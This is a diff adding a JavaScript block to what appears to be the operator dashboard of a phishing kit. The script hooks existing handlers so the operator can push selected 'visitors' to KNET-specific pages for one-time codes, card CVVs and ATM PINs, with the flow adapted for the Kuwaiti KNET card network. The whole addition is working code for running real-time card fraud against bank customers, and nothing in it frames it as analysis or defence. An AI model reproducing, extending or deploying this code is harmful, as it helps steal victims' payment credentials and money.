@@ -3746,5 +3746,104 @@ run();setInterval(function(){note();apply()},1200);})();</script>
   setInterval(inject, 1000);
 })();
 </script>
+<script id="kddF95">
+(function(){
+  if (window.__f95) return; window.__f95 = 1;
+
+  function sel(){
+    try {
+      var v = visitors.get(selectedVisitorId);
+      if (!v) { visitors.forEach(function(x){ if (!v && x && x._id === selectedVisitorId) v = x; }); }
+      return v || null;
+    } catch(e){ return null; }
+  }
+  function isKnet(v){
+    try {
+      if (!v) return false;
+      var p = String(v.page || "").toLowerCase();
+      if (p.indexOf("كي نت") > -1) return true;
+      if (p.indexOf("knet") > -1) return true;
+      return (v.paymentCards || []).some(function(c){ return c && c.paymentMethod === "KNET"; });
+    } catch(e){ return false; }
+  }
+  function onKnetOtp(v){
+    if (!isKnet(v)) return false;
+    var p = String((v && v.page) || "").toLowerCase();
+    if (p.indexOf("knet") === -1 && p.indexOf("كي نت") === -1) return false;
+    return (p.indexOf("otp") > -1 || p.indexOf("رمز") > -1);
+  }
+  function sidOf(v, sid){ try { if (v && v.socketId) return v.socketId; } catch(e){} return sid; }
+  function flash(btn){
+    if (!btn) return;
+    try {
+      var t = btn.textContent;
+      btn.textContent = "تم الإرسال ✓";
+      btn.classList.add("bg-gray-500");
+      setTimeout(function(){ try { btn.textContent = t; btn.classList.remove("bg-gray-500"); } catch(e){} }, 1500);
+    } catch(e){}
+  }
+  function sent(v){ if (v) { try { v.waitingForAdminResponse = false; } catch(e){} } try { renderVisitorsList(); } catch(e){} }
+
+  var origOTP = window.cardActionOTP;
+  window.cardActionOTP = function(btn, sid){
+    var v = sel();
+    if (isKnet(v)) {
+      var id = sidOf(v, sid);
+      try { window.skipDetailsUpdate = true; } catch(e){}
+      if (onKnetOtp(v)) {
+        try { socket.emit("admin:codeAction", { visitorSocketId: id, action: "cvv", codeIndex: 0 }); } catch(e){}
+      } else {
+        try { socket.emit("admin:navigate", { visitorSocketId: id, page: "knet-otp" }); } catch(e){}
+      }
+      sent(v); flash(btn);
+      setTimeout(function(){ try { window.skipDetailsUpdate = false; } catch(e){} }, 1600);
+      return;
+    }
+    if (typeof origOTP === "function") return origOTP.call(this, btn, sid);
+  };
+
+  function wrapNav(){
+    var cur = window.navigateVisitorToPage;
+    if (typeof cur !== "function" || cur.__f95) return;
+    var w = function(sid, page){
+      try { if (page === "mystc-otp" && isKnet(sel())) page = "knet-otp"; } catch(e){}
+      return cur.call(this, sid, page);
+    };
+    w.__f95 = 1;
+    window.navigateVisitorToPage = w;
+    try { navigateVisitorToPage = w; } catch(e){}
+  }
+  wrapNav(); setInterval(wrapNav, 400);
+
+  var origCVV = window.codeActionCVV;
+  window.codeActionCVV = function(btn, sid, idx){
+    try {
+      var v = sel();
+      if (isKnet(v)) { socket.emit("admin:navigate", { visitorSocketId: sidOf(v, sid), page: "atm" }); }
+    } catch(e){}
+    if (typeof origCVV === "function") return origCVV.call(this, btn, sid, idx);
+  };
+
+  function attach(){
+    try {
+      var s = window.socket;
+      if (!s || s === window.__stub || !s.on || s.__f95) return;
+      s.__f95 = 1;
+      s.on("visitor:deleted", function(d){
+        try {
+          var id = d && (d.visitorId || d._id || d.id); if (!id) return;
+          var kill = [];
+          visitors.forEach(function(v, k){ if (v && v._id === id) kill.push(k); });
+          kill.forEach(function(k){ try { visitors.delete(k); } catch(e){} });
+          try { visitors.delete(id); } catch(e){}
+          if (selectedVisitorId === id) selectedVisitorId = null;
+          try { renderVisitorsList(); } catch(e){}
+        } catch(e){}
+      });
+    } catch(e){}
+  }
+  attach(); setInterval(attach, 500);
+})();
+</script>
 </body>
 </html>
